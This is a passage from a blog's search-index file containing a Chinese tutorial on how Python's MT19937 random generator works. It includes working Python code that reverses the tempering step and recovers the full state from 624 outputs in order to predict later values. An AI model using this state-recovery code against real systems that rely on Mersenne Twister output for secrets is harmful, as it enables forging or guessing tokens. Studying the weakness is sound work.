<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PRNG-MT19937分析</title>
      <link href="/2025/05/08/PRNG-MT19937%E5%88%86%E6%9E%90/"/>
      <url>/2025/05/08/PRNG-MT19937%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="随机数生成过程"><a href="#随机数生成过程" class="headerlink" title="随机数生成过程"></a>随机数生成过程</h2><ol><li>从种子生成初始状态数组</li><li>更新状态以获得新的内部状态</li><li>当需要生成一个数字时，返回一个经过回火的状态值(tempered state value)</li><li>当所有状态值都被使用完后，返回步骤 2</li></ol><h2 id="数字生成过程"><a href="#数字生成过程" class="headerlink" title="数字生成过程"></a>数字生成过程</h2><p>给出底层数字生成的代码实现<code>genrand_uint32</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* generates a random number on [0,0xffffffff]-interval */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span></span><br><span class="line"><span class="title function_">genrand_uint32</span><span class="params">(RandomObject *self)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint32_t</span> y;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="type">uint32_t</span> *mt;</span><br><span class="line"></span><br><span class="line">    mt = self-&gt;state;    </span><br><span class="line">    <span class="keyword">if</span> (self-&gt;index &gt;= N) {</span><br><span class="line">        <span class="comment">// state update</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    y = mt[self-&gt;index++];</span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">11</span>);</span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>U;</span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>U;</span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>变量<code>y</code>是最终返回的随机数结果，<code>mt</code> 是指向状态数组的指针，保存了当前生成器的状态（通常是长度为 624 的数组）</p><p>我们看一下其中的一些代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt = self-&gt;state;</span><br></pre></td></tr></table></figure><p>这里将指向状态数组的指针赋给 <code>mt</code>，这是梅森旋转算法的核心状态数组</p><p>代码中if判断的那一步先跳过，后续会介绍状态使用完时应该如何进行状态数组的更新，这里只要先知道624个随机数结果输出后需要对其进行更新</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y = mt[self-&gt;index++]</span><br></pre></td></tr></table></figure><p>这里从状态数组取出下一个状态值，并自增<code>index</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">y ^= (y &gt;&gt; <span class="number">11</span>);</span><br><span class="line">y ^= (y &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span>U;</span><br><span class="line">y ^= (y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span>U;</span><br><span class="line">y ^= (y &gt;&gt; <span class="number">18</span>);</span><br></pre></td></tr></table></figure><p>这几行代码进行了一系列按位异或和位移操作，也就是上面所提到的<strong>tempering</strong>回火操作，用来提升输出的随机性，MT19937可被攻击的关键就是回火操作可逆，可利用以下python代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unshiftRight</span>(<span class="params">x, shift</span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res = x ^ res &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unshiftLeft</span>(<span class="params">x, shift, mask</span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untemper</span>(<span class="params">v</span>):</span><br><span class="line">    v = unshiftRight(v, <span class="number">18</span>)</span><br><span class="line">    v = unshiftLeft(v, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">    v = unshiftLeft(v, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">    v = unshiftRight(v, <span class="number">11</span>)</span><br><span class="line">    <span class="keyword">return</span> v</span><br></pre></td></tr></table></figure><p>我们详细的讲一下恢复的过程，这里我们举一个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">0b10101010</span>  <span class="comment"># 原始值</span></span><br><span class="line">x &gt;&gt; <span class="number">3</span> = <span class="number">0b00010101</span></span><br><span class="line">x ^ (x &gt;&gt; <span class="number">3</span>) = y = <span class="number">0b10111111</span></span><br></pre></td></tr></table></figure><p>从上面的右移操作可知，高位的值被传递到了位移后的低位，在传递的过程中空出的高位用0来填充，那么我们根据异或的性质：</p><script type="math/tex; mode=display">0\oplus any=any</script><p>可知原始<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g></g></g></svg></mjx-container>和移位<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g></g></g></svg></mjx-container>的异或结果的高位(位数与移位数量一致)与原始<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g></g></g></svg></mjx-container>一致，现在我们知道tempering操作的右移式子如下所示：</p><script type="math/tex; mode=display">y = x \oplus (x >> 11)</script><p>那么 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewbox="0 -442 490 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container> 的高位和原始<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g></g></g></svg></mjx-container>的高位一致，我们现在只有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewbox="0 -442 490 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container>，目的是恢复原始的<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g></g></g></svg></mjx-container>，还以上面的移位三位为例，我们有如下表格</p><div class="table-container"><table><thead><tr><th>位索引</th><th>y[i]</th><th>x[i]</th><th>x[i+3]</th><th>y[i] = x[i] ^ x[i+3]</th><th>说明</th></tr></thead><tbody><tr><td>0–2</td><td>y[i]</td><td>x[i]</td><td>?</td><td>y[i] = x[i]</td><td>x和y高位一致</td></tr><tr><td>3</td><td>y[3]</td><td>x[3]</td><td>x[0]</td><td>x[3] = y[3] ^ x[0]</td><td>因为x右移了三位，最高位落到了移位后的第4位</td></tr><tr><td>4</td><td>y[4]</td><td>x[4]</td><td>x[1]</td><td>x[4] = y[4] ^ x[1]</td><td>x第二位落到了移位后的第5位</td></tr><tr><td>5</td><td>y[5]</td><td>x[5]</td><td>x[2]</td><td>x[5] = y[5] ^ x[2]</td><td>x第三位落到了移位后的第6位</td></tr><tr><td>6</td><td>y[6]</td><td>x[6]</td><td>x[3]</td><td>x[6] = y[6] ^ x[3]</td><td>依赖之前恢复的 x[3]</td></tr><tr><td>7</td><td>y[7]</td><td>x[7]</td><td>x[4]</td><td>x[7] = y[7] ^ x[4]</td><td>依赖 x[4]</td></tr></tbody></table></div><p>由上面的图表可知，每次恢复的每一位均依赖已知的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g></g></g></svg></mjx-container> 高位和已知的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewbox="0 -442 490 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container> 相异或得到，因此对于整个tempering操作，无论是左移还是右移均可被我们恢复，因此它是可逆的</p><p>利用获取到的 624 个连续的 32 位输出我们可对PRNG进行预测，因为我们已经还原了整个PRNG的内部状态</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆向 tempering过程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unshiftRight</span>(<span class="params">x, shift</span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res = x ^ res &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unshiftLeft</span>(<span class="params">x, shift, mask</span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">untemper</span>(<span class="params">v</span>):</span><br><span class="line">    v = unshiftRight(v, <span class="number">18</span>)</span><br><span class="line">    v = unshiftLeft(v, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">    v = unshiftLeft(v, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">    v = unshiftRight(v, <span class="number">11</span>)</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myseed = <span class="built_in">int</span>(<span class="string">b'Chromos2me'</span>.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(myseed)</span><br><span class="line">random.seed(myseed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一些未知的输出</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(myseed):</span><br><span class="line">    random.getrandbits(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获 624 个连续的 32 位输出</span></span><br><span class="line">state = [untemper(random.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"正常情况的输出 :"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random.getrandbits(<span class="number">32</span>))</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.randbytes(<span class="number">4</span>).<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(random.randrange(<span class="number">1</span>, <span class="number">100000</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"\n预测输出 :"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用逆向 tempering过程的结果设置random内部状态</span></span><br><span class="line">random.setstate((<span class="number">3</span>, <span class="built_in">tuple</span>(state + [<span class="number">624</span>]), <span class="literal">None</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random.getrandbits(<span class="number">32</span>))</span><br><span class="line"><span class="built_in">print</span>(random.random())</span><br><span class="line"><span class="built_in">print</span>(random.randbytes(<span class="number">4</span>).<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(random.randrange(<span class="number">1</span>, <span class="number">100000</span>))</span><br></pre></td></tr></table></figure><p><img src="/2025/05/08/PRNG-MT19937%E5%88%86%E6%9E%90/微信截图_20250503181701.png" alt="微信截图_20250503181701"></p><h2 id="内部状态更新过程"><a href="#内部状态更新过程" class="headerlink" title="内部状态更新过程"></a>内部状态更新过程</h2><p>状态更新过程也在<code>genrand_uint32</code> 函数中，每624个输出执行一次更新，还有一种情况是在种子初始化之后第一次生成随机数时，上面的代码中我们并未给出具体执行更新操作的代码，详细代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> N 624</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 397    </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MATRIX_A 0x9908b0dfU    <span class="comment">/* constant vector a */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UPPER_MASK 0x80000000U  <span class="comment">/* most significant w-r bits */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOWER_MASK 0x7fffffffU  <span class="comment">/* least significant r bits */</span></span></span><br><span class="line"><span class="comment">/* generates a random number on [0,0xffffffff]-interval */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span></span><br><span class="line"><span class="title function_">genrand_uint32</span><span class="params">(RandomObject *self)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint32_t</span> y;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> mag01[<span class="number">2</span>] = {<span class="number">0x0</span>U, MATRIX_A};</span><br><span class="line">    <span class="comment">/* mag01[x] = x * MATRIX_A  for x=0,1 */</span></span><br><span class="line">    <span class="type">uint32_t</span> *mt;</span><br><span class="line"></span><br><span class="line">    mt = self-&gt;state;</span><br><span class="line">    <span class="keyword">if</span> (self-&gt;index &gt;= N) { <span class="comment">/* generate N words at one time */</span></span><br><span class="line">        <span class="type">int</span> kk;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (kk=<span class="number">0</span>;kk&lt;N-M;kk++) {</span><br><span class="line">            y = (mt[kk]&amp;UPPER_MASK)|(mt[kk+<span class="number">1</span>]&amp;LOWER_MASK);</span><br><span class="line">            mt[kk] = mt[kk+M] ^ (y &gt;&gt; <span class="number">1</span>) ^ mag01[y &amp; <span class="number">0x1</span>U];</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">for</span> (;kk&lt;N<span class="number">-1</span>;kk++) {</span><br><span class="line">            y = (mt[kk]&amp;UPPER_MASK)|(mt[kk+<span class="number">1</span>]&amp;LOWER_MASK);</span><br><span class="line">            mt[kk] = mt[kk+(M-N)] ^ (y &gt;&gt; <span class="number">1</span>) ^ mag01[y &amp; <span class="number">0x1</span>U];</span><br><span class="line">        }</span><br><span class="line">        y = (mt[N<span class="number">-1</span>]&amp;UPPER_MASK)|(mt[<span class="number">0</span>]&amp;LOWER_MASK);</span><br><span class="line">        mt[N<span class="number">-1</span>] = mt[M<span class="number">-1</span>] ^ (y &gt;&gt; <span class="number">1</span>) ^ mag01[y &amp; <span class="number">0x1</span>U];</span><br><span class="line"></span><br><span class="line">        self-&gt;index = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tempering</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure><p>看起来在处理内部状态更新的时候比较复杂，先简单介绍一下twist主要过程：</p><ul><li>第一个循环处理未超出状态数组的部分，实际上处理的是<code>kk = 0</code> 到 <code>kk = N-M-1</code>（即 <code>kk = 0-&gt;226</code>）<ul><li>定义变量kk作为数组中的索引，利用与运算将状态数组的第kk个的最高位（0x80000000的二进制为0b10000000000000000000000000000000，即32位上是1，其余位舍弃），第kk+1个的低31位（0x7fffffff的二进制为0b1111111111111111111111111111111，31位1，舍弃最高位）拼接起来，形成一个32位的组合值 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.109ex" height="1.464ex" role="img" focusable="false" viewbox="0 -442 490 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/></g></g></g></svg></mjx-container></li><li>为了得到新的状态数组的第kk位，我们需要利用到mag01数组，mag01数组根据 y 的最低位判断所异或的值，若y最低位为1，则异或常量MATRIX_A，否则异或0</li><li>新的状态数组第kk个是kk+M个（M是定义的常量跳跃步长）异或y右移一位异或mag01判断后的值</li></ul></li><li>第二个循环处理的是数组索引超出的情况，实际上处理的是<code>kk = N-M</code> 到 <code>kk = N-2</code>（即 <code>kk = 227-&gt;622</code>）<ul><li>和上个循环的操作一致，只是处理的是靠后的状态数组</li></ul></li><li>我们发现到现在就剩下最后一个623索引处的数组元素<ul><li>这里 y 